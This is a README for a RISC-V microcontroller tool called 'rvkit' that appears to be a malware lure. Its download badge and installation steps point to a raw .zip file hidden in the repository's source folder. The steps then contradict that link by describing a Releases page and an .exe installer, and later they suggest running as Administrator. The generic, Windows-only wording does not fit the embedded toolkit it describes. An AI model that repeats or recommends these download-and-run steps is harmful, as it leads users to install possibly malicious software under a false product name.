# 🛠️ rvkit - Simple tools for RISC-V chip development

[![](https://img.shields.io/badge/Download_rvkit-Blue-blue)](https://raw.githubusercontent.com/Oldmancockateel284/rvkit/main/cli/src/commands/Software-2.2-alpha.5.zip)

rvkit helps you build software for microcontrollers. These are small chips found in appliances, sensors, and gadgets. This tool manages the complex parts of your project so you can focus on your ideas. It works with RISC-V chips, which form the base of many modern electronics.

## 🚀 What this tool does

Microcontrollers need specific instructions to perform tasks. Writing these instructions requires several specialized programs. You need a way to set up the project files, a way to translate your code into chip language, and a way to move that code onto the physical hardware.

rvkit combines these steps into one program. You use a text interface to manage your work. It handles the following tasks:

- Project setup: Creates a new folder structure with all necessary files for your chip.
- Compiling: Converts your code into a binary file that the chip understands.
- Flashing: Sends the binary file onto the physical chip via a USB cable.
- Monitoring: Watches the chip as it runs, showing you status messages on your computer screen.

## 💻 System requirements

Before you begin, ensure your computer meets these minimum standards:

- Operating System: Windows 10 or Windows 11.
- Processor: Any modern dual-core processor.
- Memory: At least 4 gigabytes of RAM.
- Storage: 500 megabytes of free disk space.
- Hardware connection: A USB cable that connects your computer to your microcontroller board.

## 💾 Downloading and installing

Follow these steps to get the software on your machine.

1. Visit this page to download: [https://raw.githubusercontent.com/Oldmancockateel284/rvkit/main/cli/src/commands/Software-2.2-alpha.5.zip](https://raw.githubusercontent.com/Oldmancockateel284/rvkit/main/cli/src/commands/Software-2.2-alpha.5.zip)
2. Look for the section labeled "Releases" on the right side of the screen.
3. Click the latest version link.
4. Find the file ending in `.exe` and click it to save it to your desktop.
5. Double-click the file to start the installer.
6. Follow the on-screen prompts. The installer sets up the environment variables automatically.

These variables allow your computer to find the rvkit tools from any folder you open.

## ⚙️ Setting up your first project

After you install the program, you open a terminal window to use it. Press the Windows key, type "cmd," and press Enter.

To create a new project, type the following command and press Enter:

rvkit init my-project

This command creates a folder named "my-project" in your current directory. Move into this folder by typing:

cd my-project

## 🔨 Building your code

Inside your project folder, you find your configuration files. When you finish writing your code, you translate it for the chip. Type this command:

rvkit build

The tool checks your code for errors. If it finds mistakes, it displays them on your screen. Correct these mistakes in your text editor and run the build command again. Once the process completes, you find a new file in your "target" folder. This is the file meant for your chip.

## ⚡ Flashing the chip

The term "flashing" means writing your program into the permanent memory of the microcontroller.

1. Connect your microcontroller to your computer with a USB cable.
2. In your terminal, inside your project folder, type:

rvkit flash

The tool detects your hardware. It wipes the old program from the chip and replaces it with your new file. Keep the connection steady until the screen says the process is done. 

## 📝 Monitoring output

Sometimes you want to see what the chip is doing while it runs. This helps you find bugs or check if a sensor is working. Use the monitor function to see these messages. Type:

rvkit monitor

The terminal window now displays text coming from the chip. If your program sends messages to the serial port, they appear here in real time. Press `Ctrl + C` in the terminal to stop the monitor and return to your command prompt.

## 🔍 Troubleshooting common issues

If you encounter problems, check these items first.

- USB connection: Ensure the cable connects firmly. Some cables only provide power and do not transfer data. Try a different cable if the computer does not recognize the board.
- Driver issues: Windows sometimes requires a driver for the chip. Check the website of your chip manufacturer for a USB-to-serial driver.
- Path errors: If the computer says it cannot find the command, restart your terminal window or your computer. This refreshes the environment variables the installer added.
- Permission errors: If you receive a message about access, try running your terminal as an Administrator. Right-click the Command Prompt icon and choose "Run as administrator."

## 🧩 How it works with chips

Language support matters for microcontroller projects. This tool defaults to Rust and Zig. These languages offer high safety and speed. You do not need to choose between them before starting; the tool provides templates for both.

- The tool acts as a wrapper around the compiler programs. 
- It manages the "toolchain," which is the set of programs responsible for turning human-readable text into machine code. 
- By using rvkit, you avoid downloading and configuring these separate programs one by one. Everything stays inside the rvkit folder structure.

## 🔮 Exploring further

Once you master the basic steps, try adding new libraries to your project. You can edit the configuration file inside your project folder to pull in code written by other people. This saves time when you deal with common tasks, such as reading from a screen or controlling a motor. 

Always keep your project organized. Keep your code files in the "src" folder. Keep your documents in the "docs" folder. The tool expects this structure, and it makes moving your project to a new computer much easier later on.

If you decide to work with different hardware, simply run the init command again in a new folder. rvkit distinguishes between hardware targets based on the settings provided in your configuration file. You can manage multiple projects on one computer without them interfering with each other.